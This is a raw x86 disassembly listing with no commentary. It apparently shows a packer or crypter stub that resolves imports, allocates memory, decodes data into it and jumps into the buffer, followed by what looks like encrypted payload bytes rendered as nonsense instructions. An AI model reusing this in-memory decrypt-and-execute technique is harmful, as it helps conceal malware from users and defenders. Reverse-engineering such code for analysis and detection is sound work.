  42164f:	call   DWORD PTR ds:0x428000
  421655:	mov    BYTE PTR [ebp-0x40],0x56
  421659:	call   DWORD PTR ds:0x428010
  42165f:	mov    DWORD PTR [ebp-0x2c],eax
  421662:	mov    BYTE PTR [ebp-0x3e],0x72
  421666:	movzx  edx,WORD PTR [ebp-0x2c]
  42166a:	test   edx,edx
  42166c:	jne    0x4216ae
  42166e:	mov    BYTE PTR [ebp-0x34],0x0
  421672:	mov    DWORD PTR [ebp-0x14],0xe0d
  421679:	lea    eax,[ebp-0x28]
  42167c:	push   eax
  42167d:	call   DWORD PTR ds:0x428014
  421683:	mov    DWORD PTR [ebp-0x68],eax
  421686:	mov    DWORD PTR [ebp-0x5c],0x3a
  42168d:	lea    ecx,[ebp-0x40]
  421690:	push   ecx
  421691:	mov    edx,DWORD PTR [ebp-0x68]
  421694:	push   edx
  421695:	call   DWORD PTR ds:0x428018
  42169b:	mov    DWORD PTR [ebp-0x44],eax
  42169e:	mov    DWORD PTR [ebp-0x8],0xad731bb1
  4216a5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ac:	jmp    0x4216c3
  4216ae:	mov    BYTE PTR ds:0x443a58,0x0
  4216b5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216bc:	mov    BYTE PTR ds:0x441b18,0x0
  4216c3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216ca:	push   DWORD PTR ds:0x428014
  4216d0:	pop    edx
  4216d1:	mov    DWORD PTR [ebp-0x74],edx
  4216d4:	push   DWORD PTR [ebp-0x30]
  4216d7:	push   0x1000
  4216dc:	mov    eax,DWORD PTR [ebp-0x14]
  4216df:	add    eax,0x23
  4216e2:	add    eax,0x23
  4216e5:	push   eax
  4216e6:	xor    eax,eax
  4216e8:	push   eax
  4216e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216ec:	call   ecx
  4216ee:	mov    edx,eax
  4216f0:	mov    DWORD PTR [ebp-0x4],edx
  4216f3:	mov    eax,DWORD PTR [ebp-0x70]
  4216f6:	sub    eax,0xdae0b
  4216fb:	mov    DWORD PTR [ebp-0x70],eax
  4216fe:	cmp    DWORD PTR [ebp-0x4],0x0
  421702:	jne    0x42170b
  421704:	mov    BYTE PTR ds:0x441b18,0x0
  42170b:	mov    ecx,DWORD PTR [ebp-0x4]
  42170e:	add    ecx,DWORD PTR [ebp-0x14]
  421711:	mov    edx,DWORD PTR [ebp-0x8]
  421714:	mov    DWORD PTR [ecx],edx
  421716:	mov    eax,DWORD PTR [ebp-0x4]
  421719:	add    eax,DWORD PTR [ebp-0x5c]
  42171c:	mov    DWORD PTR [ebp-0x64],eax
  42171f:	mov    ecx,DWORD PTR ds:0x428018
  421725:	mov    DWORD PTR [ebp-0x54],ecx
  421728:	mov    edx,DWORD PTR [ebp-0x4]
  42172b:	add    edx,DWORD PTR [ebp-0x14]
  42172e:	mov    eax,DWORD PTR [ebp+0x8]
  421731:	mov    DWORD PTR [edx+0x4],eax
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	add    ecx,DWORD PTR [ebp-0x14]
  42173a:	mov    DWORD PTR [ebp-0xc],ecx
  42173d:	cmp    DWORD PTR [ebp-0x70],0x0
  421741:	jbe    0x42175e
  421743:	mov    edx,DWORD PTR [ebp-0xc]
  421746:	push   edx
  421747:	mov    eax,DWORD PTR [ebp-0x14]
  42174a:	push   eax
  42174b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42174e:	add    ecx,DWORD PTR [ebp-0x70]
  421751:	push   ecx
  421752:	mov    edx,DWORD PTR [ebp-0x4]
  421755:	push   edx
  421756:	call   0x4214d0
  42175b:	add    esp,0x10
  42175e:	cmp    DWORD PTR [ebp-0x64],0x0
  421762:	je     0x421776
  421764:	mov    ecx,DWORD PTR [ebp-0x54]
  421767:	push   ecx
  421768:	push   DWORD PTR [ebp-0x74]
  42176b:	mov    esi,DWORD PTR [ebp-0x64]
  42176e:	push   edx
  42176f:	pop    eax
  421770:	push   ecx
  421771:	nop
  421772:	jmp    esi
  421774:	jmp    0x42177c
  421776:	mov    eax,DWORD PTR [ebp+0x8]
  421779:	mov    DWORD PTR [ebp-0x18],eax
  42177c:	mov    eax,0x1
  421781:	pop    esi
  421782:	mov    esp,ebp
  421784:	pop    ebp
  421785:	ret    
  421786:	int3   
  421787:	int3   
  421788:	int3   
  421789:	int3   
  42178a:	int3   
  42178b:	int3   
  42178c:	int3   
  42178d:	int3   
  42178e:	int3   
  42178f:	int3   
  421790:	push   ebp
  421791:	mov    ebp,esp
  421793:	sub    esp,0x18
  421796:	lea    eax,[ebp-0x18]
  421799:	push   eax
  42179a:	call   DWORD PTR ds:0x42800c
  4217a0:	cmp    WORD PTR [ebp-0x18],0x0
  4217a5:	je     0x4217e8
  4217a7:	mov    ecx,DWORD PTR ds:0x428010
  4217ad:	push   0x0
  4217af:	push   0xb2
  4217b4:	push   0x82
  4217b9:	push   0x0
  4217bb:	mov    DWORD PTR [ebp-0x4],ecx
  4217be:	call   DWORD PTR ds:0x428008
  4217c4:	push   DWORD PTR [ebp-0x4]
  4217c7:	pop    edx
  4217c8:	call   edx
  4217ca:	push   eax
  4217cb:	pop    DWORD PTR [ebp-0x8]
  4217ce:	push   0xdff75a8f
  4217d3:	call   0x421550
  4217d8:	add    esp,0x4
  4217db:	call   0x411000
  4217e0:	xor    eax,eax
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    0x10
  4217e8:	dec    DWORD PTR [edi+0x6c]
  4217eb:	jp     0x42176e
  4217ed:	pop    esi
  4217ee:	push   ebp
  4217ef:	adc    eax,0xdaf8a95c
  4217f4:	stc    
  4217f5:	loopne 0x4217f4
  4217f7:	ss jmp 0xad5c:0x15555d39
  4217ff:	clc    
  421800:	fidivr DWORD PTR [ecx-0x15c9fde1]
  421806:	sbb    DWORD PTR [ebp+0x55],0xf8ad5c15
  42180d:	(bad)  
  42180f:	pop    ds
  421810:	add    dh,BYTE PTR [esi]
  421812:	jmp    0xad5c:0x15555d81
  421819:	clc    
  42181a:	(bad)  
  42181c:	pop    ds
  42181d:	add    dh,BYTE PTR [esi]
  42181f:	jmp    0x555c:0x15555d81
  421826:	clc    
  421827:	(bad)  
  421829:	adc    DWORD PTR ds:0xe981e48c,ebx
  42182f:	pop    esp
  421830:	fdivr  DWORD PTR [ebp+0x15]
  421833:	stc    
  421834:	xchg   esi,eax
  421835:	xor    al,0x3e
  421837:	push   esi
  421838:	pop    esi
  421839:	xor    edx,0x7d
  42183c:	and    eax,0x8aca3367
  421841:	mov    ebx,0x57613f94
  421846:	test   bh,ch
  421848:	xor    ah,BYTE PTR [ecx]
  42184a:	xor    eax,0xa8d8c83e
  42184f:	mov    WORD PTR [ecx+0x22],?
  421852:	pop    edi
  421853:	test   BYTE PTR [ecx+0x7c461a19],ah
  421859:	rcl    BYTE PTR [edi+0xf319cbe],0x3b
  421860:	loopne 0x421807
  421862:	pop    ebp
  421863:	push   ebp
  421864:	adc    eax,0xdaf8ad5c
  421869:	inc    BYTE PTR [esi+0x79a96ffe]
  42186f:	iret   
  421870:	pop    edi
  421871:	push   esi
  421872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421873:	aas    
  421874:	repnz cdq 
  421876:	add    DWORD PTR [ebp-0x727091f8],ecx
  42187c:	push   edi
  42187d:	or     ch,ch
  42187f:	into   
  421880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421881:	mov    al,ds:0xc015c1bf
  421886:	into   
  421887:	js     0x421814
  421889:	add    eax,0xc5562c30
  42188e:	add    BYTE PTR [eax-0xd],cl
  421891:	xor    ecx,DWORD PTR [edi+ecx*1-0x385a3820]
  421898:	pop    ds
  421899:	push   ss
  42189a:	sub    eax,0xe7b3d0e9
  42189f:	nop
  4218a0:	cmp    al,0xa0
  4218a2:	add    DWORD PTR [edi+ebx*2+0x4d],ebx
  4218a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218a7:	aas    
  4218a8:	repnz cdq 
  4218aa:	add    DWORD PTR [eax+ecx*1+0x5713131e],ecx
  4218b1:	jmp    0x6b22:0xb5a7dccd
  4218b8:	adc    eax,0x8bd7535a
  4218bd:	push   ebp
  4218be:	lods   eax,DWORD PTR ds:[esi]
  4218bf:	xchg   DWORD PTR [esi-0xb],edx
  4218c2:	popf   
  4218c3:	shl    bl,cl
  4218c5:	pop    ebp
  4218c6:	cli    
  4218c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218c8:	loopne 0x4218a3
  4218ca:	cmp    BYTE PTR [edx+0x1f],bl
  4218cd:	push   ds
  4218ce:	push   ebp
  4218cf:	push   0xffffffd0
  4218d1:	stos   DWORD PTR es:[edi],eax
  4218d2:	jbe    0x421935
  4218d4:	pop    esi
  4218d5:	test   eax,0x155fcf79
  4218da:	pop    esp
  4218db:	lods   eax,DWORD PTR ds:[esi]
  4218dc:	clc    
  4218dd:	(bad)  
  4218df:	pop    ds
  4218e0:	add    ah,BYTE PTR [esi-0x51]
  4218e3:	sbb    DWORD PTR [ebp+0x19],0x58ad5e14
  4218ea:	or     dl,BYTE PTR [edx-0x15c9fdb0]
  4218f0:	sbb    DWORD PTR [ebp+0x55],0xf84d5c15
  4218f7:	fprem  
  4218f9:	adc    al,0x3
  4218fb:	cmp    al,0xea
  4218fd:	xor    DWORD PTR [ebx+0x115c1551],0x1ff9dafe
  421907:	add    dh,BYTE PTR [esi]
  421909:	sti    
  42190a:	cmp    al,0x5d
  42190c:	push   ebp
  42190d:	adc    eax,0xdaf8ad4c
  421912:	stc    
  421913:	sbb    al,BYTE PTR [edx]
  421915:	ss jmp 0xad5c:0x5555dc0
  42191d:	clc    
  42191e:	fdivr  st,st(1)
  421920:	pop    ds
  421921:	pop    es
  421922:	ss jmp 0x4218a6
  421925:	pop    ebp
  421926:	push   ebp
  421927:	adc    eax,0xdbf8a85c
  42192c:	stc    
  42192d:	pop    ds
  42192e:	add    dh,BYTE PTR [esi]
  421930:	jmp    0xa95c:0x15590d81
  421937:	clc    
  421938:	(bad)  
  42193a:	sti    
  42193b:	pop    es
  42193c:	ss call 0x161776c3
  421942:	pop    esp
  421943:	mov    ebp,0x1fe9daf8
  421948:	add    dh,BYTE PTR [esi]
  42194a:	jmp    0xad5c:0x5555d91
  421951:	clc    
  421952:	(bad)  
  421954:	pop    ds
  421955:	adc    dh,BYTE PTR [esi]
  421957:	jmp    0xad5c:0x15555d81
  42195e:	clc    
  42195f:	(bad)  
  421961:	jmp    0x42199e
  421963:	cmp    ch,dl
  421965:	call   0x5c576ec8
  42196a:	pop    ebp
  42196b:	repz fidiv DWORD PTR [esi-0x15c9fdaa]
  421972:	sbb    DWORD PTR [ebp+0x55],0xf8ad5c15
  421979:	(bad)  
  42197b:	pop    ds
  42197c:	add    dh,BYTE PTR [esi]
  42197e:	jmp    0xad5c:0x15555d81
  421985:	clc    
  421986:	(bad)  
  421988:	pop    ds
  421989:	add    dh,BYTE PTR [esi]
  42198b:	jmp    0xad5c:0x15555d81
  421992:	clc    
  421993:	(bad)  
  421995:	pop    ds
  421996:	add    dh,BYTE PTR [esi]
  421998:	jmp    0xad5c:0x15555d81
  42199f:	clc    
  4219a0:	(bad)  
  4219a2:	pop    ds
  4219a3:	add    dh,BYTE PTR [esi]
  4219a5:	jmp    0xad5c:0x15555d81
  4219ac:	clc    
  4219ad:	(bad)  
  4219af:	pop    ds
  4219b0:	add    dh,BYTE PTR [esi]
  4219b2:	jmp    0xad5c:0x15555d81
  4219b9:	clc    
  4219ba:	(bad)  
  4219bc:	pop    ds
  4219bd:	add    dh,BYTE PTR [esi]
  4219bf:	jmp    0xad5c:0x15555d81
  4219c6:	clc    
  4219c7:	(bad)  
  4219c9:	pop    ds
  4219ca:	add    dh,BYTE PTR [esi]
  4219cc:	jmp    0xad5c:0x15555d81
  4219d3:	clc    
  4219d4:	(bad)  
  4219d6:	pop    ds
  4219d7:	add    dh,BYTE PTR [esi]
  4219d9:	(bad)  
  4219da:	cmc    
  4219db:	cmp    BYTE PTR ds:0xf8ad5c61,ch
  4219e1:	ficomp DWORD PTR [ecx]
  4219e3:	adc    al,0x2
  4219e5:	ss cli 
  4219e7:	sbb    DWORD PTR [ebp+0x55],0xf8ad58c1
  4219ee:	fdivp  st(1),st
  4219f0:	pop    ds
  4219f1:	push   edx
  4219f2:	jae    0x42199d
  4219f4:	mov    bl,0x9
  4219f6:	sbb    dl,BYTE PTR ds:0xdaf8ad5c
  4219fc:	stc    
  4219fd:	aas    
  4219fe:	add    dh,BYTE PTR [esi]
  421a00:	or     ch,BYTE PTR [edi+0x3f67262f]
  421a06:	lods   eax,DWORD PTR ds:[esi]
  421a07:	clc    
  421a08:	(bad)  
  421a0a:	jg     0x421a0e
  421a0c:	ss jmp 0xad06:0x15555671
  421a14:	clc    
  421a15:	fisub  DWORD PTR [ecx]
  421a17:	sbb    eax,DWORD PTR [edx]
  421a19:	ss jmp 0xad5c:0x15555d81
  421a21:	clc    
  421a22:	(bad)  
  421a24:	pop    ds
  421a25:	and    dh,BYTE PTR [esi]
  421a27:	jmp    0xad5c:0x15555d61
  421a2e:	clc    
  421a2f:	(bad)  
  421a31:	pop    ds
  421a32:	add    dh,BYTE PTR [esi]
  421a34:	jmp    0xad5c:0x15555d81
  421a3b:	clc    
  421a3c:	(bad)  
  421a3e:	pop    ds
  421a3f:	add    dh,BYTE PTR [esi]
  421a41:	jmp    0xad5c:0x15555d81
  421a48:	clc    
  421a49:	(bad)  
  421a4b:	pop    ds
  421a4c:	add    dh,BYTE PTR [esi]
  421a4e:	jmp    0xad5c:0x15555d81
  421a55:	clc    
  421a56:	(bad)  
  421a58:	pop    ds
  421a59:	add    dh,BYTE PTR [esi]
  421a5b:	jmp    0xad5c:0x15555d81
  421a62:	clc    
  421a63:	(bad)  
  421a65:	pop    ds
  421a66:	add    dh,BYTE PTR [esi]
  421a68:	jmp    0xad5c:0x15555d81
  421a6f:	clc    
  421a70:	(bad)  
  421a72:	pop    ds
  421a73:	add    dh,BYTE PTR [esi]
  421a75:	jmp    0xad5c:0x15555d81
  421a7c:	clc    
  421a7d:	(bad)  
  421a7f:	pop    ds
  421a80:	add    dh,BYTE PTR [esi]
  421a82:	jmp    0xad5c:0x15555d81
  421a89:	clc    
  421a8a:	(bad)  
  421a8c:	pop    ds
  421a8d:	add    dh,BYTE PTR [esi]
  421a8f:	jmp    0xad5c:0x15555d81
  421a96:	clc    
  421a97:	(bad)  
  421a99:	pop    ds
  421a9a:	add    dh,BYTE PTR [esi]
  421a9c:	jmp    0xad5c:0x15555d81
  421aa3:	clc    
  421aa4:	(bad)  
  421aa6:	pop    ds
  421aa7:	add    dh,BYTE PTR [esi]
  421aa9:	jmp    0xad5c:0x15555d81
  421ab0:	clc    
  421ab1:	(bad)  
  421ab3:	pop    ds
  421ab4:	add    dh,BYTE PTR [esi]
  421ab6:	jmp    0xad5c:0x15555d81
  421abd:	clc    
  421abe:	(bad)  
  421ac0:	pop    ds
  421ac1:	add    dh,BYTE PTR [esi]
  421ac3:	jmp    0xad5c:0x15555d81
  421aca:	clc    
  421acb:	(bad)  
  421acd:	pop    ds
  421ace:	add    dh,BYTE PTR [esi]
  421ad0:	jmp    0xad5c:0x15555d81
  421ad7:	clc    
  421ad8:	(bad)  
  421ada:	pop    ds
  421adb:	add    dh,BYTE PTR [esi]
  421add:	jmp    0xad5c:0x15555d81
  421ae4:	clc    
  421ae5:	(bad)  
  421ae7:	pop    ds
  421ae8:	add    dh,BYTE PTR [esi]
  421aea:	jmp    0xad5c:0x15555d81
  421af1:	clc    
  421af2:	(bad)  
  421af4:	pop    ds
  421af5:	add    dh,BYTE PTR [esi]
  421af7:	jmp    0xad5c:0x15555d81
  421afe:	clc    
  421aff:	(bad)  
  421b01:	pop    ds
  421b02:	add    dh,BYTE PTR [esi]
  421b04:	jmp    0xad5c:0x15555d81
  421b0b:	clc    
  421b0c:	(bad)  
  421b0e:	pop    ds
  421b0f:	add    dh,BYTE PTR [esi]
  421b11:	jmp    0xad5c:0x15555d81
  421b18:	clc    
  421b19:	(bad)  
  421b1b:	pop    ds
  421b1c:	add    dh,BYTE PTR [esi]
  421b1e:	jmp    0xad5c:0x15555d81
  421b25:	clc    
  421b26:	(bad)  
  421b28:	pop    ds
  421b29:	add    dh,BYTE PTR [esi]
  421b2b:	jmp    0xad5c:0x15555d81
  421b32:	clc    
  421b33:	(bad)  
  421b35:	pop    ds
  421b36:	add    dh,BYTE PTR [esi]
  421b38:	jmp    0xad5c:0x15555d81
  421b3f:	clc    
  421b40:	(bad)  
  421b42:	pop    ds
  421b43:	add    dh,BYTE PTR [esi]
  421b45:	jmp    0xad5c:0x15555d81
  421b4c:	clc    
  421b4d:	(bad)  
  421b4f:	pop    ds
  421b50:	add    dh,BYTE PTR [esi]
  421b52:	jmp    0xad5c:0x15555d81
  421b59:	clc    
  421b5a:	(bad)  
  421b5c:	pop    ds
  421b5d:	add    dh,BYTE PTR [esi]
  421b5f:	jmp    0xad5c:0x15555d81
  421b66:	clc    
  421b67:	(bad)  
  421b69:	pop    ds
  421b6a:	add    dh,BYTE PTR [esi]
  421b6c:	jmp    0xad5c:0x15555d81
  421b73:	clc    
  421b74:	(bad)  
  421b76:	pop    ds
  421b77:	add    dh,BYTE PTR [esi]
  421b79:	jmp    0xad5c:0x15555d81
  421b80:	clc    
  421b81:	(bad)  
  421b83:	pop    ds
  421b84:	add    dh,BYTE PTR [esi]
  421b86:	jmp    0xad5c:0x15555d81
  421b8d:	clc    
  421b8e:	(bad)  
  421b90:	pop    ds
  421b91:	add    dh,BYTE PTR [esi]
  421b93:	jmp    0xad5c:0x15555d81
  421b9a:	clc    
  421b9b:	(bad)  
  421b9d:	pop    ds
  421b9e:	add    dh,BYTE PTR [esi]
  421ba0:	jmp    0xad5c:0x15555d81
  421ba7:	clc    
  421ba8:	(bad)  
  421baa:	pop    ds
  421bab:	add    dh,BYTE PTR [esi]
  421bad:	jmp    0xad5c:0x15555d81
  421bb4:	clc    
  421bb5:	(bad)  
  421bb7:	pop    ds
  421bb8:	add    dh,BYTE PTR [esi]
  421bba:	jmp    0xad5c:0x15555d81
  421bc1:	clc    
  421bc2:	(bad)  
  421bc4:	pop    ds
  421bc5:	add    dh,BYTE PTR [esi]
  421bc7:	jmp    0xad5c:0x15555d81
  421bce:	clc    
  421bcf:	(bad)  
  421bd1:	pop    ds
  421bd2:	add    dh,BYTE PTR [esi]
  421bd4:	jmp    0xad5c:0x15555d81
  421bdb:	clc    
  421bdc:	(bad)  
  421bde:	pop    ds
  421bdf:	add    dh,BYTE PTR [esi]
  421be1:	jmp    0xad5c:0x15555d81
  421be8:	clc    
  421be9:	mov    ch,0x51
  421beb:	adc    al,0x2
  421bed:	sbb    edx,ebp
  421bef:	or     DWORD PTR [ebp+0x55],0x220f7615
  421bf6:	stos   DWORD PTR es:[edi],eax
  421bf7:	lahf   
  421bf8:	loopne 0x421c29
  421bfa:	test   al,0x6d
  421bfc:	shl    DWORD PTR [eax+0x194ffd63],1
  421c02:	ins    DWORD PTR es:[edi],dx
  421c03:	mov    esp,0x25589b88
  421c08:	pop    ebx
  421c09:	ss dec ebx
  421c0b:	cmp    cl,dh
  421c0d:	(bad)  
  421c0e:	sub    al,0x3e
  421c10:	hlt    
  421c11:	fwait
  421c12:	(bad)  
  421c13:	cmp    eax,0xecced90f
  421c18:	inc    edx
  421c19:	aaa    
  421c1a:	pop    esp
  421c1b:	mov    bl,BYTE PTR [edi+0x52]
  421c1e:	lods   al,BYTE PTR ds:[esi]
  421c1f:	dec    esi
  421c20:	outs   dx,DWORD PTR ds:[esi]
  421c21:	lahf   
  421c22:	fdivr  DWORD PTR [eax+eax*4-0x5dc35bbf]
  421c29:	inc    BYTE PTR es:[edx+0x53]
  421c2d:	shl    ebx,1
  421c2f:	lds    edi,FWORD PTR [ecx-0x3d]
  421c32:	pop    edi
  421c33:	cli    
  421c34:	cmp    BYTE PTR [ebp-0x4af72aa5],cl
  421c3a:	das    
  421c3b:	jae    0x421bcf
  421c3d:	(bad)  
  421c3e:	or     al,0x16
  421c40:	fucomi st,st(5)
  421c42:	jmp    0x421c15
  421c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c45:	fs sahf 
  421c47:	pop    eax
  421c48:	aam    0xed
  421c4a:	xor    eax,0xb87e66df
  421c4f:	mov    WORD PTR [eax],cs
  421c51:	mov    ebx,0x22a47f72
  421c56:	(bad)  
  421c57:	data16 idiv BYTE PTR [ebp+0x5e]
  421c5b:	mov    ebx,0xa6c15892
  421c60:	lods   eax,DWORD PTR ds:[esi]
  421c61:	mov    eax,0x74fa5670
  421c66:	pop    ss
  421c67:	cmp    esp,DWORD PTR [ebx+0x4e16c99c]
  421c6d:	adc    BYTE PTR [esp+edx*4-0x4c],ch
  421c71:	cmp    al,0x70
  421c73:	pop    edi
  421c74:	push   eax
  421c75:	cwde   
  421c76:	cmp    BYTE PTR [ecx+0x117bca55],dh
  421c7c:	inc    edx
  421c7d:	ins    DWORD PTR es:[edi],dx
  421c7e:	test   eax,0xe193091f
  421c83:	or     BYTE PTR [edx],0xd0
  421c86:	jne    0x421cd6
  421c88:	sbb    al,BYTE PTR [ebp-0x5ae8d114]
  421c8e:	pmullw mm5,mm5
  421c91:	mov    bh,0xc2
  421c93:	aad    0xa9
  421c95:	call   0xcbefad28
  421c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c9b:	call   0x6afe:0xf0ed9d36
  421ca2:	imul   eax,esp,0x96cfbf5a
  421ca8:	fisub  WORD PTR [eax+0x3b58e6a4]
  421cae:	ret    0x15b6
  421cb1:	add    eax,0x9a84822e
  421cb6:	je     0x421cb3
  421cb8:	ss push es
  421cba:	ins    DWORD PTR es:[edi],dx
  421cbb:	or     BYTE PTR [eax+0xb],bh
  421cbe:	sbb    al,0x8f
  421cc0:	sbb    ah,BYTE PTR [ecx+0x55264fb5]
  421cc6:	outs   dx,BYTE PTR ds:[si]
  421cc8:	xchg   edi,eax
  421cc9:	add    DWORD PTR [ebx+0x2],ebp
  421ccc:	jbe    0x421cf3
  421cce:	inc    edi
  421ccf:	pop    ecx
  421cd0:	dec    esi
  421cd1:	dec    ebx
  421cd2:	push   es
  421cd3:	xor    eax,0x478aefa9
  421cd8:	add    DWORD PTR [eax+0x7cf489a9],edx
  421cde:	iret   
  421cdf:	and    al,0xc3
  421ce1:	frstor [edx+0x48]
  421ce4:	(bad)  
  421ce6:	add    al,BYTE PTR [ebp+0x2b0f266e]
  421cec:	xchg   esp,eax
  421ced:	or     eax,0xb0b6bb0e
  421cf2:	inc    eax
  421cf3:	lahf   
  421cf4:	push   ss
  421cf5:	pushf  
  421cf6:	mov    ebx,DWORD PTR ds:0x5e14de6d
  421cfc:	scas   al,BYTE PTR es:[edi]
  421cfd:	mov    eax,ds:0xcddb4e48
  421d02:	test   eax,0xfb1e401a
  421d07:	out    0x60,al
  421d09:	arpl   WORD PTR [edi+0x3],cx
  421d0c:	jae    0x421c8f
  421d0e:	mov    DWORD PTR [esp+edi*2+0x7],edx
  421d12:	jp     0x421d1d
  421d14:	dec    ebp
  421d15:	neg    BYTE PTR [edx-0x4fd40d88]
  421d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d1c:	(bad)  
  421d1e:	fldlg2 
  421d20:	mov    DWORD PTR ds:0xc745c5d7,edi
  421d26:	pop    ebx
  421d27:	js     0x421d25
  421d29:	inc    esp
  421d2a:	fistp  DWORD PTR [ecx+0x17]
  421d2d:	or     al,0xaf
  421d2f:	mov    bh,0xd3
  421d31:	ss jecxz 0x421cf1
  421d34:	push   ecx
  421d35:	and    esp,DWORD PTR [ecx+0x749cf659]
  421d3b:	mov    bl,0xb
  421d3d:	daa    
  421d3e:	sub    eax,0x531a4d4b
  421d43:	jnp    0x421d6a
  421d45:	hlt    
  421d46:	(bad)  
  421d47:	and    eax,0x4edbedc5
  421d4c:	adc    cl,BYTE PTR [edi]
  421d4e:	pop    edx
  421d4f:	xor    eax,0xeace4a5a
  421d54:	loope  0x421d78
  421d56:	lods   al,BYTE PTR ds:[esi]
  421d57:	sbb    DWORD PTR [esi+0x3047c3f5],ecx
  421d5d:	and    ah,BYTE PTR [edi+edi*1+0x7f706412]
  421d64:	fisttp DWORD PTR [edi+0x7d]
  421d67:	aam    0xf7
  421d69:	cld    
  421d6a:	xchg   ecx,eax
  421d6b:	imul   ecx,DWORD PTR [ecx],0xffffff89
  421d6e:	scas   eax,DWORD PTR es:[edi]
  421d6f:	mov    ss,esp
  421d71:	adc    DWORD PTR [ebx-0x822886a],ecx
  421d77:	test   BYTE PTR [edx+ebx*2],bl
  421d7a:	or     DWORD PTR [ebx+0x4a6f0765],0x49
  421d81:	pop    esp
  421d82:	adc    BYTE PTR [ebx],dl
  421d84:	add    DWORD PTR [edx+0x1d8add54],esp
  421d8a:	mov    edi,0x414f201b
  421d8f:	mov    ds:0x613f4c3e,eax
  421d94:	inc    edx
  421d95:	push   ds
  421d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d97:	inc    eax
  421d98:	jbe    0x421d1a
  421d9a:	cmp    eax,0xd32ce7af
  421d9f:	xchg   DWORD PTR [ebx+0x15a059c4],esp
  421da5:	leave  
  421da6:	and    BYTE PTR [ebp-0x69],bh
  421da9:	adc    edi,DWORD PTR [edx+ecx*2]
  421dac:	push   eax
  421dad:	push   edx
  421dae:	push   ecx
  421daf:	cmc    
  421db0:	jb     0x421e19
  421db2:	xchg   ebp,eax
  421db3:	add    BYTE PTR [ebx+0x7a],dh
  421db6:	stc    
  421db7:	pop    ebp
  421db8:	add    BYTE PTR [ebx+ebx*8+0x69],bh
  421dbc:	cs sti 
  421dbe:	les    ecx,FWORD PTR [bx+0x7c31]
  421dc3:	pop    ebx
  421dc4:	jmp    0x472e:0x12c74543
  421dcb:	std    
  421dcc:	jno    0x421e38
  421dce:	mov    WORD PTR [eax-0x32d6f897],es
  421dd4:	push   es
  421dd5:	call   0x4ca878e7
  421dda:	xor    edi,ecx
  421ddc:	pop    ebx
  421ddd:	sub    dl,BYTE PTR [ecx]
  421ddf:	fld    st(0)
  421de1:	xchg   ebx,eax
  421de2:	fidivr WORD PTR [edx]
  421de4:	mov    ds:0xdb0ffdd1,eax
  421de9:	ja     0x421df8
  421deb:	xchg   ebx,eax
  421dec:	test   BYTE PTR [esi+0x2e],ch
  421def:	and    eax,0xe4355280
  421df4:	cmp    edi,edi
  421df6:	push   0x64
  421df8:	pop    esi
  421df9:	aas    
  421dfa:	loope  0x421e0c
  421dfc:	pusha  
  421dfd:	out    0xe9,eax
  421dff:	aas    
  421e00:	sbb    ebx,DWORD PTR es:[esi+esi*8-0x656024be]
  421e08:	loopne 0x421db0
  421e0a:	aam    0xc8
  421e0c:	call   0x72b56ac1
  421e11:	scas   eax,DWORD PTR es:[edi]
  421e12:	or     DWORD PTR [eax-0x192197a8],ecx
  421e18:	cmp    edi,DWORD PTR [edx-0x929a6ed]
  421e1e:	aaa    
  421e1f:	jg     0x421e93
  421e21:	sub    eax,0x64b92242
  421e26:	call   0xca57:0xdebf1f6b
  421e2d:	mov    cl,BYTE PTR [edx+0x4f]
  421e30:	mov    edi,0xcee40cbe
  421e35:	(bad)  
  421e36:	add    esp,DWORD PTR [bx+si]
  421e39:	sbb    BYTE PTR [ebp+0x13],ch
  421e3c:	push   ebx
  421e3d:	(bad)  
  421e3e:	push   ebx
  421e3f:	call   0x9a49:0x6edb6bdf
  421e46:	pop    ds
  421e47:	push   esp
  421e48:	inc    ebx
  421e49:	and    BYTE PTR [ecx-0x4a36b459],0x67
  421e50:	sub    edx,edi
  421e52:	ret    0xaba5
  421e55:	push   ds
  421e56:	push   0xffffffb6
  421e58:	fwait
  421e59:	in     eax,0x1e
  421e5b:	out    0xa1,al
  421e5d:	ret    0x9495
  421e60:	and    al,0xab
  421e62:	inc    ebp
  421e63:	pop    ebx
  421e64:	xor    eax,0xc4569237
  421e69:	call   0xe1bfb4c8
  421e6e:	adc    eax,0xf3978884
  421e73:	pusha  
  421e74:	in     eax,dx
  421e75:	mov    ebp,0x358cfa79
  421e7a:	sub    DWORD PTR [edi+0x28e62385],edi
  421e80:	nop
  421e81:	and    DWORD PTR [edi-0x14f93a7a],0xda59d242
  421e8b:	loop   0x421e74
  421e8d:	cmp    eax,0xa00ab2a8
  421e92:	jmp    0xb7d6:0x62ffc43c
  421e99:	jo     0x421e73
  421e9b:	lock pop esi
  421e9d:	jmp    0xae1c:0x1e75221c
  421ea4:	psubw  mm2,QWORD PTR [edx+ebp*8+0x52]
  421ea9:	add    al,0x72
  421eab:	sar    ebp,cl
  421ead:	clc    
  421eae:	cmp    BYTE PTR [ebx-0x4a44ce68],bl
  421eb4:	adc    al,0x7e
  421eb6:	hlt    
  421eb7:	shr    DWORD PTR [esi-0x7],1
  421eba:	(bad)  
  421ebb:	cmp    DWORD PTR [edi+0x4],edx
  421ebe:	in     al,0xd6
  421ec0:	jns    0x421f13
  421ec2:	pop    ebp
  421ec3:	in     eax,0x15
  421ec5:	push   ss
  421ec6:	jo     0x421f0c
  421ec8:	jne    0x421e57
  421eca:	xchg   ecx,eax
  421ecb:	es pop edx
  421ecd:	out    dx,eax
  421ece:	mov    edx,0x66911c56
  421ed3:	(bad)  
  421ed4:	xchg   edx,eax
  421ed5:	pop    edx
  421ed6:	mov    ebp,0xff77b8ea
  421edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421edc:	pop    ebx
  421edd:	jns    0x421eef
  421edf:	inc    ebx
  421ee0:	sahf   
